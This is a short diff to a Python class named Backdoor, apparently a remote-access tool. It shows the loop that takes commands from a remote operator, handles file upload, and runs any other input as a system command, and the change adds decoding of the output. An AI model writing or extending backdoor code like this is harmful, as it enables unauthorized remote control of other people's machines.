@@ -61,7 +61,7 @@ class Backdoor:
                 elif command[0] == "upload":
                     command_result = self.write_file(command[1], command[2])
                 else:
-                    command_result = self.execute_system_command(command)
+                    command_result = self.execute_system_command(command).decode()
 
             except Exception:
                 command_result = "[-] Error during command execution"
